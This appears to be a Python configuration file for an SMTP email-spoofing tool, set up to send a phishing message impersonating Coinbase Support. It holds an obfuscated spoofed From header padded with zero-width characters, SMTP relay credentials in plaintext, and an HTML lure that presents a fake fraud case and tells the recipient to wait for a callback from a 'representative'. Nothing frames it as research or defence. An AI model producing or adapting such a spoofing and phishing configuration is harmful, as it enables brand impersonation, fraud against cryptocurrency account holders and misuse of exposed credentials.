config = {
	"attacker_site": b"officinadoriente.com",  # Your SMTP domain (attacker's site)
	"legitimate_site_address": b"=?UTF-8?B?4oCNQ2/igI3igI3igIzigI3igI1p4oCN4oCN4oCM4oCN4oCNbmJh4oCN4oCN4oCM4oCN4oCNc2UgPG5vLXJlcGx5QGNvaW5iYXNlLmNvbT4===",  # Spoofed From header (Coinbase Support name)
	"victim_address": b"victim@victim.com",  # RCPT TO address (Victim's email)
	"case_id": b"server_a1",  # Case ID (For spoofed purposes)

	# Optional fields for server settings
	"server_mode": {
		"recv_mail_server": "",  # No value, it will query the victim's address
		"recv_mail_server_port": 25,  # Mail server port
		"starttls": False,  # Set to False (optional for your use case)
	},
	"client_mode": {
		"sending_server": ("smtp.officinadoriente.com", 587),  # SMTP server of the attacker
		"username": b"info@officinadoriente.com",  # Attacker's email address (SMTP login)
		"password": b"officinadoriente@2020",  # Password for the SMTP login
	},

	# Optional email customization
	"subject_header": b"Your case is under review",  # Subject of the email
	"to_header": b"<victim@victim.com>",  # To header (Recipient's address)
	"body": b"""
	<html>
		<body>
			<h2 style='color:#1b74e4;'>Your case is under review</h2>
			<p style='font-family: Arial, sans-serif;'>Dear Customer,</p>
			<p style='font-family: Arial, sans-serif;'>We have received a report related to your account, and it is currently under review by our Fraud & Asset Loss Protection department.</p>
			<p style='font-family: Arial, sans-serif;'>Below are the details for the case. Please keep this information confidential.</p>
			<table border="1" style="border-collapse: collapse; width: 50%; font-family: Arial, sans-serif;">
				<tr>
					<th style="background-color: #f2f2f2;">Representative</th>
					<th style="background-color: #f2f2f2;">Case ID</th>
					<th style="background-color: #f2f2f2;">Department</th>
				</tr>
				<tr>
					<td>Daniel Watson</td>
					<td>2814</td>
					<td>Fraud and Asset Loss Protection</td>
				</tr>
			</table>
			<p style='font-family: Arial, sans-serif;'>If you have any questions, feel free to contact our support team. If your call is disconnected, please wait for a call back from your assigned representative.</p>
			<p style='font-family: Arial, sans-serif;'>Thank you for your understanding and cooperation.</p>
			<p style='font-family: Arial, sans-serif;'>Best regards,</p>
			<p style='font-family: Arial, sans-serif;'>Coinbase Support Team</p>
		</body>
	</html>
	""",  # The body of the email in HTML format
	"raw_email": b"",  # You can leave this empty unless performing a replay attack
}
